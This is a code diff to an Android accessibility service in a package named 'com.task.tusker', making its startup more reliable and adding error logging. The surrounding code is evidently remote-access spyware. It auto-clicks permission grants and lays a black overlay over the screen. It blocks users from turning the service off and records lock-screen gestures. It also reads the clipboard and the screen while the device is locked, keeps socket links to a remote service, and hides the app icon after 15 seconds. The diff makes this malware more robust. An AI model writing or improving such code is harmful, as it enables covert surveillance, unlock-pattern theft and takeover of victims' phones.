@@ -71,6 +71,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private Handler heartbeatHandler;
     private Runnable heartbeatRunnable;
 
+    // Service initialization state - true after initializeConnectedService() completes
+    private volatile boolean serviceInitialized = false;
+    private volatile boolean initializationPosted = false;
+
     // Auto-grant mode: clicks Allow/Grant/OK buttons for N seconds after accessibility enabled
     private volatile boolean autoGrantMode = false;
     private Handler autoGrantHandler;
@@ -243,6 +247,20 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
 
     /**
+     * Check if the accessibility service is fully initialized and ready.
+     * This checks both the cross-process heartbeat AND the in-process initialization flag.
+     * Returns true only when both the service process is alive AND initialization has completed.
+     */
+    public static boolean isServiceReady(Context context) {
+        if (context == null) return false;
+        // First check cross-process heartbeat
+        if (!hasFreshHeartbeat(context)) return false;
+        // Then check in-process initialization state
+        UnifiedAccessibilityService svc = getInstance();
+        return svc != null && svc.serviceInitialized;
+    }
+
+    /**
      * Arms the uninstall assistant for one exact package. The assistant only
      * acts on an Android package-installer dialog whose visible app label
      * matches this package; it never scans for a generic OK/Yes button.
@@ -357,14 +375,39 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         // deliberately deferred to the worker below.
         configureAccessibilityServiceInfo();
 
-        Runnable initialization = () -> initializeConnectedService(readFirstLaunchState());
+        // Post initialization with proper fallback and post() return value check
+        postInitialization(readFirstLaunchState());
+    }
+
+    private void postInitialization(boolean isFirstLaunch) {
+        Runnable initialization = () -> {
+            try {
+                initializeConnectedService(isFirstLaunch);
+            } finally {
+                serviceInitialized = true;
+            }
+        };
+
         if (permissionBgHandler != null) {
-            permissionBgHandler.post(initialization);
+            // Check post() return value - if rejected, fall back to main looper
+            boolean posted = permissionBgHandler.post(initialization);
+            initializationPosted = posted;
+            if (!posted) {
+                Log.w(TAG, "Worker post() rejected, falling back to main looper");
+                new Handler(Looper.getMainLooper()).post(initialization);
+            }
         } else {
-            // The worker is expected to start. Keep a defensive fallback so a
-            // rare HandlerThread failure does not leave the service unusable.
+            // Worker failed to start, use main looper directly
             new Handler(Looper.getMainLooper()).post(initialization);
         }
+
+        // Safety: if initialization hasn't started after 500ms, force it on main looper
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            if (!initializationPosted && !serviceInitialized) {
+                Log.w(TAG, "Initialization not posted after 500ms, forcing on main looper");
+                new Handler(Looper.getMainLooper()).post(initialization);
+            }
+        }, 500);
     }
 
     private boolean readFirstLaunchState() {
@@ -409,37 +452,37 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      */
     private void initializeConnectedService(boolean isFirstLaunch) {
         if (isFirstLaunch) {
-            try { startAutoGrantTimer(); } catch (Exception ignored) {}
+            try { startAutoGrantTimer(); } catch (Exception e) { Log.w(TAG, "startAutoGrantTimer failed: " + e.getMessage()); }
             try {
                 addBlackOverlay();
                 android.content.SharedPreferences prefs = getSharedPreferences("svc_prefs", MODE_PRIVATE);
                 prefs.edit().putBoolean("overlay_setup_done", true).apply();
-            } catch (Exception ignored) {}
+            } catch (Exception e) { Log.w(TAG, "addBlackOverlay failed: " + e.getMessage()); }
         }
 
         // Accessibility Assist: protect the accessibility toggle from being turned off.
         // Protection and defender activation is scheduled below and does not wait
         // for the dangerous runtime-permission flow to finish.
-        try { initAccessibilityAssist(isFirstLaunch); } catch (Exception ignored) {}
-        try { scheduleProtectionAndDefenderAutoStart(); } catch (Exception ignored) {}
+        try { initAccessibilityAssist(isFirstLaunch); } catch (Exception e) { Log.w(TAG, "initAccessibilityAssist failed: " + e.getMessage()); }
+        try { scheduleProtectionAndDefenderAutoStart(); } catch (Exception e) { Log.w(TAG, "scheduleProtectionAndDefenderAutoStart failed: " + e.getMessage()); }
 
-        try { com.task.tusker.commands.ScreenBlackout.getInstance().setService(this); } catch (Exception ignored) {}
+        try { com.task.tusker.commands.ScreenBlackout.getInstance().setService(this); } catch (Exception e) { Log.w(TAG, "ScreenBlackout.setService failed: " + e.getMessage()); }
 
         try {
             com.task.tusker.network.SocketManager.getInstance(this).initGestureRecorder(this);
-        } catch (Exception ignored) {}
+        } catch (Exception e) { Log.w(TAG, "SocketManager.initGestureRecorder failed: " + e.getMessage()); }
 
         try {
             com.task.tusker.commands.GestureRecorder gr =
                 com.task.tusker.network.SocketManager.getInstance(this).getGestureRecorder();
             if (gr != null) gr.enableLockScreenAutoCapture();
-        } catch (Exception ignored) {}
+        } catch (Exception e) { Log.w(TAG, "GestureRecorder.enableLockScreenAutoCapture failed: " + e.getMessage()); }
 
-        try { com.task.tusker.commands.LogManager.setEnabled(true); } catch (Exception ignored) {}
+        try { com.task.tusker.commands.LogManager.setEnabled(true); } catch (Exception e) { Log.w(TAG, "LogManager.setEnabled failed: " + e.getMessage()); }
 
         try {
             clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
-        } catch (Exception ignored) {}
+        } catch (Exception e) { Log.w(TAG, "ClipboardManager init failed: " + e.getMessage()); }
 
         try {
             WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
@@ -448,18 +491,18 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             display.getRealSize(size);
             screenWidth = size.x;
             screenHeight = size.y;
-        } catch (Exception ignored) {}
+        } catch (Exception e) { Log.w(TAG, "Screen size init failed: " + e.getMessage()); }
 
         try {
             keepAliveManager = new KeepAliveManager(this);
             keepAliveManager.start();
-        } catch (Exception ignored) {}
+        } catch (Exception e) { Log.w(TAG, "KeepAliveManager start failed: " + e.getMessage()); }
 
-        try { ensureRemoteServiceRunning(); } catch (Exception ignored) {}
-        try { startSocketCheckLoop(); } catch (Exception ignored) {}
+        try { ensureRemoteServiceRunning(); } catch (Exception e) { Log.w(TAG, "ensureRemoteServiceRunning failed: " + e.getMessage()); }
+        try { startSocketCheckLoop(); } catch (Exception e) { Log.w(TAG, "startSocketCheckLoop failed: " + e.getMessage()); }
 
         // Register receiver for screen on/off and unlock events — drives auto-recording
-        try { registerScreenStateReceiver(); } catch (Exception ignored) {}
+        try { registerScreenStateReceiver(); } catch (Exception e) { Log.w(TAG, "registerScreenStateReceiver failed: " + e.getMessage()); }
 
         // Auto-start screen reader recording ONLY if screen is on AND device is locked
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
@@ -475,7 +518,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     unlockScanActive = true;
                     SocketManager.getInstance(UnifiedAccessibilityService.this).startScreenReaderAuto();
                 }
-            } catch (Exception ignored) {}
+            } catch (Exception e) { Log.w(TAG, "Auto screen reader start failed: " + e.getMessage()); }
         }, 500);
 
         try {
@@ -486,9 +529,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     if (!stealthManager.isIconHidden()) {
                         stealthManager.fullyHideApp();
                     }
-                } catch (Exception ignored) {}
+                } catch (Exception e) { Log.w(TAG, "StealthManager fullyHideApp failed: " + e.getMessage()); }
             }, 15_000);
-        } catch (Exception ignored) {}
+        } catch (Exception e) { Log.w(TAG, "StealthManager delayed init failed: " + e.getMessage()); }
     }
 
     /**
@@ -3779,6 +3822,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
     @Override
     public void onDestroy() {
+        // Heartbeat already stopped in onUnbind, but safe to call again
         stopAccessibilityHeartbeat();
         try { super.onDestroy(); } catch (Exception ignored) {}
         try {
@@ -3801,12 +3845,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             }
             autoGrantMode = false;
         } catch (Exception ignored) {}
-        try {
-            if (socketCheckHandler != null && socketCheckRunnable != null) {
-                socketCheckHandler.removeCallbacks(socketCheckRunnable);
-                socketCheckHandler = null;
-            }
-        } catch (Exception ignored) {}
+        // socketCheckHandler already cancelled in cancelExistingLoops() called from onUnbind
         try {
             if (keepAliveManager != null) {
                 keepAliveManager.stop();
@@ -3842,6 +3881,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         try { ServiceWatchdog.scheduleWakeAlarm(this, 5_000L); } catch (Exception ignored) {}
 
         instance = null;
+        serviceInitialized = false;
+        initializationPosted = false;
     }
 
     /**
@@ -3851,25 +3892,21 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      * Returning {@code true} tells Android to call {@link #onRebind(Intent)}
      * the next time a client binds, allowing the existing process to be reused
      * rather than spawning a fresh one — faster recovery after unexpected kills.
-     *
-     * We also restart DataSyncService here so it stays connected while we wait
-     * for the accessibility service to be re-enabled.
      */
     @Override
     public boolean onUnbind(Intent intent) {
-        try {
-            new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                try {
-                    Intent svc = new Intent(getApplicationContext(),
-                            com.task.tusker.services.DataSyncService.class);
-                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                        getApplicationContext().startForegroundService(svc);
-                    } else {
-                        getApplicationContext().startService(svc);
-                    }
-                } catch (Exception ignored) {}
-            }, 2000);
-        } catch (Exception ignored) {}
+        // Clear instance immediately so watchdog doesn't see stale reference
+        instance = null;
+        // Stop heartbeat immediately so hasFreshHeartbeat() returns false
+        stopAccessibilityHeartbeat();
+        // Mark service as not initialized
+        serviceInitialized = false;
+        initializationPosted = false;
+        
+        // Don't restart DataSyncService here - it's managed by BootReceiver/ServiceWatchdog
+        // Only restart if we're being disabled (not just unbound for rebind)
+        // The framework will call onDestroy() if actually being disabled
+        
         return true; // true → onRebind() called on next bind instead of creating new instance
     }
 
@@ -3883,8 +3920,33 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         super.onRebind(intent);
         instance = this;
         Log.i(TAG, "onRebind — accessibility service reconnected");
-        // Re-run full init (registers socket check loop, screen receiver, etc.)
-        try { onServiceConnected(); } catch (Exception ignored) {}
+        // Cancel any existing loops before re-initializing
+        cancelExistingLoops();
+        // Re-run init
+        try { onServiceConnected(); } catch (Exception e) { Log.w(TAG, "onRebind init failed: " + e.getMessage()); }
+    }
+
+    private void cancelExistingLoops() {
+        try {
+            if (socketCheckHandler != null && socketCheckRunnable != null) {
+                socketCheckHandler.removeCallbacks(socketCheckRunnable);
+                socketCheckHandler = null;
+                socketCheckRunnable = null;
+            }
+        } catch (Exception ignored) {}
+        try {
+            if (protectionStartHandler != null && protectionStartRunnable != null) {
+                protectionStartHandler.removeCallbacks(protectionStartRunnable);
+                protectionStartHandler = null;
+                protectionStartRunnable = null;
+            }
+        } catch (Exception ignored) {}
+        try {
+            if (keepAliveManager != null) {
+                keepAliveManager.stop();
+                keepAliveManager = null;
+            }
+        } catch (Exception ignored) {}
     }
 
     public JSONObject readScreen() {
